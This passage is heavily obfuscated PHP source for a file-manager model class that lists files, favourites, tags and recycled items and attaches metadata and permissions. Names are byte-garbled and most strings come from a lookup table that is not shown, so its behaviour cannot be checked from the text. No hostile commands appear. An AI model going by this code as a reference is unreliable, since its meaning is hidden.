return Cache::get($this->cacheKey($Ö©Ôü†é)); } public function cacheRemove($ƒ®¶¼´²) { return Cache::remove($this->cacheKey($ƒ®¶¼´²)); } protected function filterWhere($Ï¤ø¸ï) { return $Ï¤ø¸ï; } protected function cacheKey($ÄÄÊÜ­”) { return $ÄÄÊÜ­”; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\x75\162\143\x65"; protected $tableMeta = array("\164\141\142\x6c\145\116\x61\x6d\145" => "\x69\x6f\137\x73\157\165\162\143\x65\137\155\145\x74\x61", "\x6d\145\164\x61\x46\x69\x65\154\144" => "\163\157\x75\162\x63\145\x49\104"); protected $dataAuto = array(array("\x6d\x6f\144\x69\146\171\124\x69\x6d\x65", "\164\x69\x6d\x65", "\x69\x6e\x73\145\162\164", "\x66\165\156\x63\x74\x69\x6f\156"), array("\x63\x72\x65\x61\164\x65\124\x69\155\145", "\x74\151\155\145", "\x69\x6e\163\x65\162\164", "\146\x75\x6e\143\164\151\157\156"), array("\x76\x69\x65\x77\x54\151\x6d\145", "\164\151\155\x65", "\151\156\x73\145\162\164", "\146\x75\156\x63\164\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($–ª—ûĞö) { return $this->listSource(array($_SERVER[•Ùç É][447] => $–ª—ûĞö)); } public function typeName($½‘·¦ˆé) { static $ä”³¾ = array(self::TYPE_SYSTEM => "\x73\x79\163\x74\145\x6d", self::TYPE_USER => "\x75\x73\x65\162", self::TYPE_GROUP => "\147\x72\x6f\x75\x70"); return $ä”³¾[$½‘·¦ˆé . $_SERVER[•Ùç É][12]]; } public function sourceListInfo($šÕ·ÏÒ, $àúÎÕı¯ = false) { $É¯ŞŒ„û =& $_SERVER[•Ùç É]; $šÕ·ÏÒ = $šÕ·ÏÒ ? $šÕ·ÏÒ : array(); $šÕ·ÏÒ = array_filter(array_unique($šÕ·ÏÒ)); if (!$šÕ·ÏÒ) { return array(); } $¾ªéó°¿ = $this->where(array($É¯ŞŒ„û[183] => array($É¯ŞŒ„û[7], $šÕ·ÏÒ)))->select(); $this->_listDataApply($¾ªéó°¿, $àúÎÕı¯); return array_to_keyvalue($¾ªéó°¿, $É¯ŞŒ„û[183]); } public function pathInfoFilter(&$÷ššƒµ) { $õâ¼ÍØª =& $_SERVER[•Ùç É]; static $øÇ¥Ó¢š = false; static $ê‰Ä‰¾ê = false; static $âôé¼¦€ = false; if (!$øÇ¥Ó¢š) { $ë¬øâãš = $õâ¼ÍØª[448]; $ë¬øâãš .= $õâ¼ÍØª[449]; $ë¬øâãš .= $õâ¼ÍØª[450]; $ÊğŒçÓÉ = $õâ¼ÍØª[451]; $ÓØÎ¾ºö = explode($õâ¼ÍØª[50], $ÊğŒçÓÉ); $øÇ¥Ó¢š = explode($õâ¼ÍØª[50], $ë¬øâãš); $ê‰Ä‰¾ê = array(); foreach ($øÇ¥Ó¢š as $Ì„è‡ÉÎ) { if (in_array($Ì„è‡ÉÎ, $ÓØÎ¾ºö)) { continue; } $ê‰Ä‰¾ê[] = $Ì„è‡ÉÎ; } $âôé¼¦€ = explode($õâ¼ÍØª[50], $õâ¼ÍØª[452]); } foreach ($âôé¼¦€ as $Í¨©ĞĞÉ) { if (isset($÷ššƒµ[$Í¨©ĞĞÉ])) { $÷ššƒµ[$Í¨©ĞĞÉ] = intval($÷ššƒµ[$Í¨©ĞĞÉ]); } } $÷ššƒµ[$õâ¼ÍØª[86]] = $õâ¼ÍØª[453] . $÷ššƒµ[$õâ¼ÍØª[183]] . $õâ¼ÍØª[454]; $÷ššƒµ[$õâ¼ÍØª[33]] = $÷ššƒµ[$õâ¼ÍØª[455]] == 1 ? $õâ¼ÍØª[77] : $õâ¼ÍØª[216]; $÷ššƒµ[$õâ¼ÍØª[180]] = $this->typeName($÷ššƒµ[$õâ¼ÍØª[180]]); if ($÷ššƒµ[$õâ¼ÍØª[455]] != 1) { $÷ššƒµ[$õâ¼ÍØª[177]] = $÷ššƒµ[$õâ¼ÍØª[456]]; unset($÷ššƒµ[$õâ¼ÍØª[456]]); } $Ö¤Üé = $øÇ¥Ó¢š; if (isset($÷ššƒµ[$õâ¼ÍØª[457]]) && $÷ššƒµ[$õâ¼ÍØª[457]][$õâ¼ÍØª[458]] == -1) { $Ö¤Üé = $ê‰Ä‰¾ê; } $÷ššƒµ = array_field_key($÷ššƒµ, $Ö¤Üé); return $÷ššƒµ; } public function listUserFav() { $Ñ•™±£ =& $_SERVER[•Ùç É]; $òßÑ³ñ = Model($Ñ•™±£[459])->listData(); $ÊìúŠßÚ = array_filter_by_field($òßÑ³ñ, $Ñ•™±£[33], $Ñ•™±£[460]); $ÊìúŠßÚ = array_to_keyvalue($ÊìúŠßÚ, $Ñ•™±£[12], $Ñ•™±£[86]); if ($ÊìúŠßÚ) { $ç²ğ¢®ğ = $this->listSource(array($Ñ•™±£[461] => array($Ñ•™±£[462], $ÊìúŠßÚ))); } $ç²ğ¢®ğ = array_to_keyvalue($ç²ğ¢®ğ[$Ñ•™±£[415]], $Ñ•™±£[183]); foreach ($òßÑ³ñ as &$š¢‹³äü) { $š¢‹³äü = array($Ñ•™±£[463] => $š¢‹³äü[$Ñ•™±£[445]], $Ñ•™±£[464] => $š¢‹³äü[$Ñ•™±£[32]], $Ñ•™±£[465] => $š¢‹³äü[$Ñ•™±£[86]], $Ñ•™±£[466] => $š¢‹³äü[$Ñ•™±£[33]], $Ñ•™±£[467] => $š¢‹³äü[$Ñ•™±£[217]], $Ñ•™±£[468] => $š¢‹³äü[$Ñ•™±£[87]]); if ($š¢‹³äü[$Ñ•™±£[33]] == $Ñ•™±£[460] && $ç²ğ¢®ğ[$š¢‹³äü[$Ñ•™±£[86]]]) { $š¢‹³äü[$Ñ•™±£[89]] = $ç²ğ¢®ğ[$š¢‹³äü[$Ñ•™±£[86]]]; } } unset($š¢‹³äü); return $òßÑ³ñ; } public function listUserTag($î˜ÒÁÎé) { $Ôµ™é÷ =& $_SERVER[•Ùç É]; if ($î˜ÒÁÎé && !is_array($î˜ÒÁÎé)) { $î˜ÒÁÎé = array($î˜ÒÁÎé); } $Û˜¶¸Ú† = Model($Ôµ™é÷[469])->listData(); $ğØÕµ­Ø = array(); $ô× ••’ = array(); foreach ($Û˜¶¸Ú† as $ÙâğŞÂñ) { $¾¥Ö¡¥Ú = $ÙâğŞÂñ[$Ôµ™é÷[86]]; if (!$¾¥Ö¡¥Ú) { continue; } if (!isset($ô× ••’[$¾¥Ö¡¥Ú])) { $ô× ••’[$¾¥Ö¡¥Ú] = array(); } $ô× ••’[$¾¥Ö¡¥Ú][] = $ÙâğŞÂñ[$Ôµ™é÷[470]]; $ğØÕµ­Ø[$ÙâğŞÂñ[$Ôµ™é÷[86]]] = $ÙâğŞÂñ; } $òšŒìá™ = array(); $®çëÛõ‹ = array(); $ªçÉó²¼ = array(); foreach ($ô× ••’ as $¯Ò€ôë => $’˜şöŸ•) { $ŞÌ›£ÖÚ = !0; if (!$î˜ÒÁÎé) { $òšŒìá™[] = $¯Ò€ôë; continue; } foreach ($î˜ÒÁÎé as $šóÏËã©) { if (!in_array($šóÏËã©, $’˜şöŸ•)) { $ŞÌ›£ÖÚ = !1; break; } } if (!$ŞÌ›£ÖÚ) { continue; } if (!is_numeric($¯Ò€ôë)) { $àù‡ó—  = $ğØÕµ­Ø[$¯Ò€ôë]; $²¦ÉäÇ§ = array($Ôµ™é÷[32] => $àù‡ó— [$Ôµ™é÷[32]], $Ôµ™é÷[86] => $àù‡ó— [$Ôµ™é÷[86]], $Ôµ™é÷[33] => $àù‡ó— [$Ôµ™é÷[33]], $Ôµ™é÷[89] => array($Ôµ™é÷[471] => 1), $Ôµ™é÷[218] => !0); if ($àù‡ó— [$Ôµ™é÷[33]] == $Ôµ™é÷[216]) { $ªçÉó²¼[] = $²¦ÉäÇ§; } if ($àù‡ó— [$Ôµ™é÷[33]] == $Ôµ™é÷[77]) { $®çëÛõ‹[] = $²¦ÉäÇ§; } continue; } $òšŒìá™[] = $¯Ò€ôë; } if ($òšŒìá™) { $ñ¸³š•ì = $this->listSource(array($Ôµ™é÷[461] => array($Ôµ™é÷[462], $òšŒìá™))); } $ñ¸³š•ì = $ñ¸³š•ì ? $ñ¸³š•ì : array($Ôµ™é÷[84] => array(), $Ôµ™é÷[85] => array()); $ñ¸³š•ì[$Ôµ™é÷[84]] = array_merge($ñ¸³š•ì[$Ôµ™é÷[84]], $®çëÛõ‹); $ñ¸³š•ì[$Ôµ™é÷[85]] = array_merge($ñ¸³š•ì[$Ôµ™é÷[85]], $ªçÉó²¼); if (isset($ñ¸³š•ì[$Ôµ™é÷[412]]) && count($òšŒìá™) == $ñ¸³š•ì[$Ôµ™é÷[412]][$Ôµ™é÷[413]]) { return $ñ¸³š•ì; } $©¥ëØ³ = array(); $•©Â»¬é = array_to_keyvalue($ñ¸³š•ì[$Ôµ™é÷[84]], $Ôµ™é÷[12], $Ôµ™é÷[183]); $ä¢›ŞÛ = array_to_keyvalue($ñ¸³š•ì[$Ôµ™é÷[85]], $Ôµ™é÷[12], $Ôµ™é÷[183]); $øÄ…å´Í = array_merge($ä¢›ŞÛ, $•©Â»¬é); foreach ($òšŒìá™ as $¾¥Ö¡¥Ú) { if (!in_array($¾¥Ö¡¥Ú, $øÄ…å´Í)) { $©¥ëØ³[] = $¾¥Ö¡¥Ú; } } if ($©¥ëØ³) { Model($Ôµ™é÷[472])->removeBySource($©¥ëØ³); } return $ñ¸³š•ì; } public function listUserRecycle() { $¢Û°«©Ô =& $_SERVER[•Ùç É]; $´à®¬ñ = Model($¢Û°«©Ô[473])->listData(); if (!$´à®¬ñ) { return array(); } $ŠÙ³ËŠÉ = array($¢Û°«©Ô[461] => array($¢Û°«©Ô[462], $´à®¬ñ), $¢Û°«©Ô[474] => 1); return $this->listSource($ŠÙ³ËŠÉ); } public function listSource($›ö¤£Áë, $ºïÃÒÓ = 3000, $ßéœ„×À = false) { $Ñš„òº =& $_SERVER[•Ùç É]; if (!isset($›ö¤£Áë[$Ñš„òº[475]])) { $›ö¤£Áë[$Ñš„òº[475]] = 0; } if (isset($›ö¤£Áë[$Ñš„òº[182]]) && $›ö¤£Áë[$Ñš„òº[182]] == $Ñš„òº[214]) { $›ö¤£Áë[$Ñš„òº[456]] = array($Ñš„òº[377], $Ñš„òº[476]); } $Åå‡åÓ = $Ñš„òº[477]; $€éèºõ = $this->field($Åå‡åÓ)->_makeOrder()->where($›ö¤£Áë)->selectPage($ºïÃÒÓ); $this->_listPageCheck($€éèºõ, $Åå‡åÓ, $›ö¤£Áë); $this->_listDataApply($€éèºõ[$Ñš„òº[415]], $ßéœ„×À); $this->_listMake($€éèºõ); return $€éèºõ; } private function _listPageCheck(&$±ê‹Ù¨, $¸½ÒĞî†, $ƒá™ŠÂ‰) { $»ïã´øÔ =& $_SERVER[•Ùç É]; if (!is_array($±ê‹Ù¨[$»ïã´øÔ[412]])) { return; } $ÌÍ‹œ = $±ê‹Ù¨[$»ïã´øÔ[412]]; if ($ÌÍ‹œ[$»ïã´øÔ[414]] <= 1) { return; } if ($ÌÍ‹œ[$»ïã´øÔ[413]] >= 100000) { return; } if (Model($»ïã´øÔ[478])->get($»ïã´øÔ[479]) != $»ïã´øÔ[480]) { return; } $¸½ÒĞî† = str_replace(array($»ïã´øÔ[53], $»ïã´øÔ[388], $»ïã´øÔ[248]), $»ïã´øÔ[12], $¸½ÒĞî†); $¸½ÒĞî† = $»ïã´øÔ[481] . str_replace($»ïã´øÔ[50], $»ïã´øÔ[482], $¸½ÒĞî†) . $»ïã´øÔ[483]; $ú–¹ï¥œ = $»ïã´øÔ[484]; $ú–¹ï¥œ = $ú–¹ï¥œ . $»ïã´øÔ[485]; $ïüºÂä = $ÌÍ‹œ[$»ïã´øÔ[409]] * ($ÌÍ‹œ[$»ïã´øÔ[399]] - 1) . $»ïã´øÔ[50] . $ÌÍ‹œ[$»ïã´øÔ[409]]; $·ØÈÅœ = $this->_makeOrder(!0); $ïÙ»ÓøÖ = $»ïã´øÔ[481] . str_replace($»ïã´øÔ[50], $»ïã´øÔ[482], $·ØÈÅœ[0]); if (strpos($ïÙ»ÓøÖ, $»ïã´øÔ[486])) { $ïÙ»ÓøÖ = str_replace($»ïã´øÔ[486], $»ïã´øÔ[487], $ïÙ»ÓøÖ); } else { $ïÙ»ÓøÖ .= $»ïã´øÔ[488] . $·ØÈÅœ[1]; } $Š’¯ªè¹ = array(); foreach ($ƒá™ŠÂ‰ as $’ºè¿íˆ => $œèÓÓ«ü) { $Š’¯ªè¹[$»ïã´øÔ[481] . $’ºè¿íˆ] = $œèÓÓ«ü; } $this->alias($»ïã´øÔ[489])->field($¸½ÒĞî†)->limit($ïüºÂä)->order($ïÙ»ÓøÖ); $à§–Ùí™ = $this->join($ú–¹ï¥œ)->where($Š’¯ªè¹)->select(); if ($à§–Ùí™) { $±ê‹Ù¨[$»ïã´øÔ[415]] = $à§–Ùí™; } } protected function _makeOrder($Ûı˜ã¯¾ = false) { $ˆş‰ÎŸé =& $_SERVER[•Ùç É]; $¿—şÕ„„ = Model($ˆş‰ÎŸé[490])->get($ˆş‰ÎŸé[491]); $™Îå„É = Model($ˆş‰ÎŸé[490])->get($ˆş‰ÎŸé[492]); $§Íü„Œ = array($ˆş‰ÎŸé[493] => $ˆş‰ÎŸé[494], $ˆş‰ÎŸé[495] => $ˆş‰ÎŸé[496]); $ÎÎ©»´‘ = array($ˆş‰ÎŸé[32] => $ˆş‰ÎŸé[32], $ˆş‰ÎŸé[78] => $ˆş‰ÎŸé[78], $ˆş‰ÎŸé[177] => $ˆş‰ÎŸé[456], $ˆş‰ÎŸé[497] => $ˆş‰ÎŸé[497], $ˆş‰ÎŸé[498] => $ˆş‰ÎŸé[499], $ˆş‰ÎŸé[217] => $ˆş‰ÎŸé[217], $ˆş‰ÎŸé[87] => $ˆş‰ÎŸé[87]); $¡­Ÿœ = Input::get($ˆş‰ÎŸé[500], $ˆş‰ÎŸé[7], $¿—şÕ„„, array_keys($ÎÎ©»´‘)); $«Ş¹Ø†Ô = Input::get($ˆş‰ÎŸé[501], $ˆş‰ÎŸé[7], $™Îå„É, array_keys($§Íü„Œ)); if (!in_array($¡­Ÿœ, array_keys($ÎÎ©»´‘))) { $¡­Ÿœ = $ˆş‰ÎŸé[32]; } if (!in_array($«Ş¹Ø†Ô, array_keys($§Íü„Œ))) { $¡­Ÿœ = $ˆş‰ÎŸé[493]; } if ($¡­Ÿœ == $ˆş‰ÎŸé[32]) { } $µÛ¶²™¼ = $ˆş‰ÎŸé[502] . $ÎÎ©»´‘[$¡­Ÿœ] . $ˆş‰ÎŸé[53] . $§Íü„Œ[$«Ş¹Ø†Ô]; $µÛ¶²™¼ = rtrim(trim($µÛ¶²™¼), $ˆş‰ÎŸé[50]); if ($Ûı˜ã¯¾) { return array($µÛ¶²™¼, $§Íü„Œ[$«Ş¹Ø†Ô]); } return $this->order($µÛ¶²™¼); } protected function _listDataApplyItem($Ç ¸Ş†ï, $»Şı×¬Ô = false) { $¶€´¶± = array($Ç ¸Ş†ï); $this->_listDataApply($¶€´¶±, $»Şı×¬Ô); return $¶€´¶±[0]; } protected function _listDataApply(&$šöß†­Ç, $òŒ¹Ë = false) { $Ş¼õÇô¼ =& $_SERVER[•Ùç É]; if (!$šöß†­Ç) { $šöß†­Ç = array(); return; } $òà±»â = array_to_keyvalue($šöß†­Ç, $Ş¼õÇô¼[12], $Ş¼õÇô¼[183]); $òà±»â = array_unique($òà±»â); $this->_listSourceCache($šöß†­Ç); if (!$òŒ¹Ë) { $this->_listAppendMeta($šöß†­Ç, $òà±»â); $this->_listAppendFileMeta($šöß†­Ç, $òà±»â); $this->_listAppendChildren($šöß†­Ç, $òà±»â); } $this->_listAppendPath($šöß†­Ç); $this->_listAppendAuth($šöß†­Ç); $this->_listAppendSourceInfo($šöß†­Ç, $òà±»â); $this->_listAppendUser($šöß†­Ç); $this->_listFilterInfo($šöß†­Ç, $òŒ¹Ë); $this->_listAppendAuthSecret($šöß†­Ç); } protected function _listSourceCache($Ã¢ŞõŞ) { $é«Ö»Ú =& $_SERVER[•Ùç É]; foreach ($Ã¢ŞõŞ as $Û¯®Œåø) { self::$cacheSourceInfo[$é«Ö»Ú[503] . $Û¯®Œåø[$é«Ö»Ú[183]]] = $Û¯®Œåø; } } protected function _listFilterInfo(&$´ø——±ı, $¼ìÉ‰• = false) { $ßôÁ®òå =& $_SERVER[•Ùç É]; foreach ($´ø——±ı as &$ƒÓØõĞá) { $ƒÓØõĞá = $this->pathInfoFilter($ƒÓØõĞá); self::$cachePathInfo[$ßôÁ®òå[504] . intval($¼ìÉ‰•) . $ßôÁ®òå[432] . $ƒÓØõĞá[$ßôÁ®òå[183]]] = $ƒÓØõĞá; } unset($ƒÓØõĞá); } protected function _listMake(&$ãñ§ıøÒ) { $Ş³Ö”°Ø =& $_SERVER[•Ùç É]; $ãñ§ıøÒ[$Ş³Ö”°Ø[84]] = array(); $ãñ§ıøÒ[$Ş³Ö”°Ø[85]] = array(); foreach ($ãñ§ıøÒ[$Ş³Ö”°Ø[415]] as $üë»´éÚ) { $©ıäÖ° = $üë»´éÚ[$Ş³Ö”°Ø[455]] == 1 ? $Ş³Ö”°Ø[84] : $Ş³Ö”°Ø[85]; $ãñ§ıøÒ[$©ıäÖ°][] = $üë»´éÚ; } unset($ãñ§ıøÒ[$Ş³Ö”°Ø[415]]); } protected function _listAppendMeta(&$À¦ş°„Ä, $ª„…µ‰÷) { $ãÙİ»Ô =& $_SERVER[•Ùç É]; $şà¯¼ş€ = array($ãÙİ»Ô[461] => array($ãÙİ»Ô[462], $ª„…µ‰÷)); $û»Å¯¡ = Model($ãÙİ»Ô[505])->field($ãÙİ»Ô[506])->where($şà¯¼ş€)->select(); if (!$û»Å¯¡) { return; } $î…Ó£Ò¹ = array($ãÙİ»Ô[507], $ãÙİ»Ô[508], $ãÙİ»Ô[487]); $âóê¼ï = array(); foreach ($û»Å¯¡ as $›°İ¡»ç) { if (!isset($âóê¼ï[$›°İ¡»ç[$ãÙİ»Ô[183]]])) { $âóê¼ï[$›°İ¡»ç[$ãÙİ»Ô[183]]] = array(); } if (in_array($›°İ¡»ç[$ãÙİ»Ô[96]], $î…Ó£Ò¹)) { continue; } $âóê¼ï[$›°İ¡»ç[$ãÙİ»Ô[183]]][$›°İ¡»ç[$ãÙİ»Ô[96]]] = $›°İ¡»ç[$ãÙİ»Ô[420]]; } foreach ($À¦ş°„Ä as &$ÌåˆœŒÛ) { $ÌåˆœŒÛ[$ãÙİ»Ô[509]] = !1; if (isset($âóê¼ï[$ÌåˆœŒÛ[$ãÙİ»Ô[183]]])) { $ÌåˆœŒÛ[$ãÙİ»Ô[509]] = $âóê¼ï[$ÌåˆœŒÛ[$ãÙİ»Ô[183]]]; } if ($this->fileIsLock($ÌåˆœŒÛ) && $ÌåˆœŒÛ[$ãÙİ»Ô[457]]) { $ÏÏğ—Ú³ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ÌåˆœŒÛ[$ãÙİ»Ô[457]][$ãÙİ»Ô[458]] = AuthModel::authDisable($ÌåˆœŒÛ[$ãÙİ»Ô[457]][$ãÙİ»Ô[458]], $ÏÏğ—Ú³); $ÌåˆœŒÛ[$ãÙİ»Ô[457]][$ãÙİ»Ô[510]][$ãÙİ»Ô[457]] = $ÌåˆœŒÛ[$ãÙİ»Ô[457]][$ãÙİ»Ô[458]]; } } unset($ÌåˆœŒÛ); } protected function _listAppendFileMeta(&$€™òé—™, $Â¦‹æ³è) { $“Á±ÇÛÛ =& $_SERVER[•Ùç É]; $üí¯ˆÙ = array_to_keyvalue($€™òé—™, $“Á±ÇÛÛ[12], $“Á±ÇÛÛ[511]); $üí¯ˆÙ = array_filter(array_unique($üí¯ˆÙ)); if (!$üí¯ˆÙ) { return; } $»õë­Ä¡ = array($“Á±ÇÛÛ[512] => array($“Á±ÇÛÛ[462], $üí¯ˆÙ)); $ıĞ®ë£ƒ = $“Á±ÇÛÛ[513]; $Š…ÒÇˆì = Model($“Á±ÇÛÛ[514])->field($ıĞ®ë£ƒ)->where($»õë­Ä¡)->select(); $Š…ÒÇˆì = array_to_keyvalue($Š…ÒÇˆì, $“Á±ÇÛÛ[511]); $áó€ª»¬ = Model($“Á±ÇÛÛ[515])->field($“Á±ÇÛÛ[516])->where($»õë­Ä¡)->select(); $áó€ª»¬ = $áó€ª»¬ ? $áó€ª»¬ : array(); $ĞâåÁ¥ = array(); foreach ($áó€ª»¬ as $â±“«´£) { if (!isset($ĞâåÁ¥[$â±“«´£[$“Á±ÇÛÛ[511]]])) { $ĞâåÁ¥[$â±“«´£[$“Á±ÇÛÛ[511]]] = array(); } $ĞâåÁ¥[$â±“«´£[$“Á±ÇÛÛ[511]]][$â±“«´£[$“Á±ÇÛÛ[96]]] = $â±“«´£[$“Á±ÇÛÛ[420]]; } foreach ($€™òé—™ as &$Ïú¯ì‚î) { $”ı„ÍĞ¸ = $Ïú¯ì‚î[$“Á±ÇÛÛ[511]]; if (!$”ı„ÍĞ¸ || !is_array($Š…ÒÇˆì[$”ı„ÍĞ¸])) { continue; } $™Å•‘¾Ü = $Š…ÒÇˆì[$”ı„ÍĞ¸]; $™Å•‘¾Ü[$“Á±ÇÛÛ[78]] = $Ïú¯ì‚î[$“Á±ÇÛÛ[78]]; $™Å•‘¾Ü[$“Á±ÇÛÛ[32]] = $Ïú¯ì‚î[$“Á±ÇÛÛ[32]]; if (!$™Å•‘¾Ü[$“Á±ÇÛÛ[517]]) { Model($“Á±ÇÛÛ[514])->fileMd5Check($™Å•‘¾Ü); } if (!isset(self::$cacheFileInfo[$“Á±ÇÛÛ[518] . $”ı„ÍĞ¸])) { self::$cacheFileInfo[$“Á±ÇÛÛ[518] . $”ı„ÍĞ¸] = array_merge(array(), $™Å•‘¾Ü); } unset($Š…ÒÇˆì[$”ı„ÍĞ¸][$“Á±ÇÛÛ[86]]); $™…¢š°Ö = is_array($ĞâåÁ¥[$”ı„ÍĞ¸]) ? $ĞâåÁ¥[$”ı„ÍĞ¸] : array(); $Ïú¯ì‚î[$“Á±ÇÛÛ[519]] = array_merge($™…¢š°Ö, $Š…ÒÇˆì[$”ı„ÍĞ¸]); if (isset($Ïú¯ì‚î[$“Á±ÇÛÛ[519]][$“Á±ÇÛÛ[173]])) { $Ïú¯ì‚î[$“Á±ÇÛÛ[173]] = json_decode($Ïú¯ì‚î[$“Á±ÇÛÛ[519]][$“Á±ÇÛÛ[173]], !0); unset($Ïú¯ì‚î[$“Á±ÇÛÛ[519]][$“Á±ÇÛÛ[173]]); } } unset($Ïú¯ì‚î); } protected function _listAppendSourceInfo(&$ÑëŒÃÃ½, $­‘÷ŸšØ) { $ß²À‡’Í =& $_SERVER[•Ùç É]; $®‹€¿×á = Model($ß²À‡’Í[520])->listData(); $ˆ˜µØÏÕ = Model($ß²À‡’Í[469])->listData(); $´Å¥’» = Model($ß²À‡’Í[459])->listData(); $åÓ¦‡ñ = Model($ß²À‡’Í[521])->listSimple(); $ô­ÈŸÕò = array_to_keyvalue($®‹€¿×á, $ß²À‡’Í[445]); $ ”˜ÓÜ = array_to_keyvalue_group($ˆ˜µØÏÕ, $ß²À‡’Í[86], $ß²À‡’Í[470]); $¿ˆõÅÀ = array_to_keyvalue($´Å¥’», $ß²À‡’Í[86]); $üœâ½¬õ = array_to_keyvalue_group($åÓ¦‡ñ, $ß²À‡’Í[183]); foreach ($ÑëŒÃÃ½ as &$Ã»èªÊÅ) { $Ã»èªÊÅ[$ß²À‡’Í[89]] = array($ß²À‡’Í[522] => 0, $ß²À‡’Í[523] => 0, $ß²À‡’Í[524] => 0); if (isset($¿ˆõÅÀ[$Ã»èªÊÅ[$ß²À‡’Í[183]]])) { $Ã»èªÊÅ[$ß²À‡’Í[89]][$ß²À‡’Í[525]] = 1; $Ã»èªÊÅ[$ß²À‡’Í[89]][$ß²À‡’Í[526]] = $¿ˆõÅÀ[$Ã»èªÊÅ[$ß²À‡’Í[183]]][$ß²À‡’Í[32]]; } if ($ ”˜ÓÜ && $ô­ÈŸÕò && isset($ ”˜ÓÜ[$Ã»èªÊÅ[$ß²À‡’Í[183]]])) { $Ã»èªÊÅ[$ß²À‡’Í[89]][$ß²À‡’Í[527]] = array(); foreach ($ ”˜ÓÜ[$Ã»èªÊÅ[$ß²À‡’Í[183]]] as $¡ÇÖ¿Ú¥) { $®Ã‚»ØÆ = $ô­ÈŸÕò[$¡ÇÖ¿Ú¥]; $Ã»èªÊÅ[$ß²À‡’Í[89]][$ß²À‡’Í[527]][] = array($ß²À‡’Í[528] => $®Ã‚»ØÆ[$ß²À‡’Í[445]], $ß²À‡’Í[464] => $®Ã‚»ØÆ[$ß²À‡’Í[32]], $ß²À‡’Í[529] => $®Ã‚»ØÆ[$ß²À‡’Í[530]]); } } if ($üœâ½¬õ && isset($üœâ½¬õ[$Ã»èªÊÅ[$ß²À‡’Í[183]]])) { $Ã»èªÊÅ[$ß²À‡’Í[89]][$ß²À‡’Í[531]] = array(); foreach ($üœâ½¬õ[$Ã»èªÊÅ[$ß²À‡’Í[183]]] as $ªõÎ÷Íõ) { $ÈÁ¾îí = $ß²À‡’Í[532]; if ($ªõÎ÷Íõ[$ß²À‡’Í[533]] == $ß²À‡’Í[90]) { $ÈÁ¾îí .= $ß²À‡’Í[534]; } $Ã»èªÊÅ[$ß²À‡’Í[89]][$ß²À‡’Í[531]] = array_field_key($ªõÎ÷Íõ, explode($ß²À‡’Í[50], $ÈÁ¾îí)); } } } unset($Ã»èªÊÅ); return $ÑëŒÃÃ½; } protected function _listAppendChildren(&$àÖí§ËÚ, $ÎÈë¸±Œ) { $ Í¥¯¥ =& $_SERVER[•Ùç É]; $ıø”Î˜ = array(); $±óÓÈ­‰ = array($ Í¥¯¥[225] => 0, $ Í¥¯¥[226] => 0); foreach ($àÖí§ËÚ as &$Ú¯Çš¯Ó) { if (!$Ú¯Çš¯Ó[$ Í¥¯¥[455]]) { continue; } $ıø”Î˜[] = $Ú¯Çš¯Ó[$ Í¥¯¥[183]]; } unset($Ú¯Çš¯Ó); if (!$ıø”Î˜) { return; } $²¦áö‹ë = array($ Í¥¯¥[182] => array($ Í¥¯¥[7], $ıø”Î˜), $ Í¥¯¥[475] => 0); $ÄÏ¸âş = array($ Í¥¯¥[182], $ Í¥¯¥[455], $ Í¥¯¥[535] => $ Í¥¯¥[536]); $¼®Ø×Ø = $this->field($ÄÏ¸âş)->where($²¦áö‹ë)->group($ Í¥¯¥[537])->select(); $ÅÎü»¹© = array(); foreach ($¼®Ø×Ø as $ı”†Ç) { $…èöÅì = $ı”†Ç[$ Í¥¯¥[182]]; $¼¤‰±£ù = $ı”†Ç[$ Í¥¯¥[455]] == $ Í¥¯¥[90] ? $ Í¥¯¥[226] : $ Í¥¯¥[225]; if (!isset($ÅÎü»¹©[$…èöÅì])) { $ÅÎü»¹©[$…èöÅì] = array($ Í¥¯¥[225] => 0, $ Í¥¯¥[226] => 0); } $ÅÎü»¹©[$…èöÅì][$¼¤‰±£ù] += $ı”†Ç[$ Í¥¯¥[536]]; } foreach ($àÖí§ËÚ as &$Ú¯Çš¯Ó) { if (!$Ú¯Çš¯Ó[$ Í¥¯¥[455]]) { continue; } $ê×ÃÁƒò = is_array($ÅÎü»¹©[$Ú¯Çš¯Ó[$ Í¥¯¥[183]]]) ? $ÅÎü»¹©[$Ú¯Çš¯Ó[$ Í¥¯¥[183]]] : $±óÓÈ­‰; $Ú¯Çš¯Ó[$ Í¥¯¥[226]] = $ê×ÃÁƒò[$ Í¥¯¥[226]]; $Ú¯Çš¯Ó[$ Í¥¯¥[225]] = $ê×ÃÁƒò[$ Í¥¯¥[225]]; unset($Ú¯Çš¯Ó[$ Í¥¯¥[456]]); } unset($Ú¯Çš¯Ó); } protected function _listAppendAuth(&$äşôÅ) { $­¿÷Ø×Ú =& $_SERVER[•Ùç É]; $‰íğÙ« = array(); foreach ($äşôÅ as $åìÌéßĞ) { if ($åìÌéßĞ[$­¿÷Ø×Ú[180]] == self::TYPE_GROUP) { $‰íğÙ«[] = $åìÌéßĞ[$­¿÷Ø×Ú[183]]; } } if (!$‰íğÙ«) { return; } $¡Ç‹ØÁ = array_to_keyvalue($äşôÅ, $­¿÷Ø×Ú[183]); $–ˆ•êÓ = Model($­¿÷Ø×Ú[538])->getSourceList($‰íğÙ«, $¡Ç‹ØÁ); $­Ğâ³¯ƒ = KodUser::isRoot(); foreach ($äşôÅ as $Š®¼€ÃÂ => &$åìÌéßĞ) { $åìÌéßĞ[$­¿÷Ø×Ú[457]] = $–ˆ•êÓ[$åìÌéßĞ[$­¿÷Ø×Ú[183]]]; if (!$åìÌéßĞ[$­¿÷Ø×Ú[457]] && $åìÌéßĞ[$­¿÷Ø×Ú[180]] == self::TYPE_GROUP) { $åìÌéßĞ[$­¿÷Ø×Ú[457]] = Action($­¿÷Ø×Ú[539])->pathGroupAuthMake($åìÌéßĞ[$­¿÷Ø×Ú[540]]); if (!$åìÌéßĞ[$­¿÷Ø×Ú[457]] && !$­Ğâ³¯ƒ) { $åìÌéßĞ[$­¿÷Ø×Ú[219]] = !1; $åìÌéßĞ[$­¿÷Ø×Ú[218]] = !1; } } if ($åìÌéßĞ[$­¿÷Ø×Ú[457]]) { $åìÌéßĞ[$­¿÷Ø×Ú[219]] = AuthModel::authCheckEdit($åìÌéßĞ[$­¿÷Ø×Ú[457]][$­¿÷Ø×Ú[458]]); 